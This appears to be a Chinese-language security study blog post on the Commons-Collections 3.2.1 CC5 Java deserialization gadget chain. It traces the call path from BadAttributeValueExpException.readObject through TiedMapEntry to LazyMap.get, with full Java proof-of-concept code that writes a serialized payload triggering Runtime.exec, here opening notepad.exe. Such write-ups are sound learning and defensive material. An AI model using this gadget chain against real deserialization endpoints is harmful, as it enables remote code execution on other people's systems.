---
title: Commons-Collections篇07-CC5链
date: 2025-9-29 20:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

## 环境搭建

- [JDK8u65](https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html)
- [openJDK 8u65](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4)
- Maven 3.6.3
- Commons-Collections 3.2.1
- pom.xml加载Commons-Collections 依赖

```
    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>
```

## 调用链

![image-20250929170847668](./Commons-Collections%E7%AF%8707-CC5%E9%93%BE/image-20250929170847668.png)

## 调用链分析

入口是`BadAttributeValueExpException.readObject()`，其中调用了`toString()`方法

if判断中，只要`val`不等于空，不是字符串，就可以绕过前两个if判断，进入到第二个`else if`中，就可以执行我们想要执行的`toSting()`方法

![image-20250929170737009](./Commons-Collections%E7%AF%8707-CC5%E9%93%BE/image-20250929170737009.png)

`TiedMapEntry`中有`toString`方法，并且调用了同名类下的`getValue()`

![image-20250929170536017](./Commons-Collections%E7%AF%8707-CC5%E9%93%BE/image-20250929170536017.png)

同名类下的`getValue()`方法调用了`get`方法()

![image-20250929170512848](./Commons-Collections%E7%AF%8707-CC5%E9%93%BE/image-20250929170512848.png)

后面就可以用`CC1链-LazyMap.get()`这条链了

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.omg.CORBA.CharSeqHelper;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC5 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform("aaa");
        HashMap hashMap = new HashMap();
        Map decoratemap = LazyMap.decorate(hashMap,chainedTransformer);

        Class lazymapclass = LazyMap.class;
        Method lazymapget = lazymapclass.getDeclaredMethod("get", Object.class);
        lazymapget.setAccessible(true);
        lazymapget.invoke(decoratemap,"aaa");
    }
}
```

# CC5链代码实现

## TiedMapEntry类调用get方法

都是`public`属性，可以直接调用，让参数`map`等于`decoratemap`即可

```java
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,"aaa");
        tiedMapEntry.toString();
```

## BadAttributeValueExpException.readObject()

这里`BadAttributeValueExpException`的构造方法也是public，但是如果传入的参数不为空就会调用`toString()`方法，我们的目的是在`readObject`中调用`toString()`方法，所以在实例化时调用有参构造时就要传入空，然后再通过反射去修改`val`值

![image-20250929172534413](./Commons-Collections%E7%AF%8707-CC5%E9%93%BE/image-20250929172534413.png)

```java
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        Class badclass = badAttributeValueExpException.getClass();
        Field valfield = badclass.getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(badAttributeValueExpException,tiedMapEntry);
        serialize(badAttributeValueExpException);
        unserialize();
```

## 完整代码

```java
package org.example;

import com.sun.xml.internal.ws.streaming.TidyXMLStreamReader;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.omg.CORBA.CharSeqHelper;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC5 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform("aaa");
        HashMap hashMap = new HashMap();
        Map decoratemap = LazyMap.decorate(hashMap,chainedTransformer);

        //为了实现LazyMap.get方法()
//        Class lazymapclass = LazyMap.class;
//        Method lazymapget = lazymapclass.getDeclaredMethod("get", Object.class);
//        lazymapget.setAccessible(true);
//        lazymapget.invoke(decoratemap,"aaa");

        TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,"aaa");
//        tiedMapEntry.toString();
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        Class badclass = badAttributeValueExpException.getClass();
        Field valfield = badclass.getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(badAttributeValueExpException,tiedMapEntry);
        serialize(badAttributeValueExpException);
        unserialize();
    }
    public  static void serialize(Object obj) throws Exception{
        java.io.ObjectOutputStream objectOutputStream = new java.io.ObjectOutputStream(new java.io.FileOutputStream("cc5.ser"));
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
    }
    public static Object unserialize() throws Exception{
        java.io.ObjectInputStream objectInputStream = new java.io.ObjectInputStream(new java.io.FileInputStream("cc5.ser"));
        Object obj = objectInputStream.readObject();
        objectInputStream.close();
        return obj;
    }
}

```

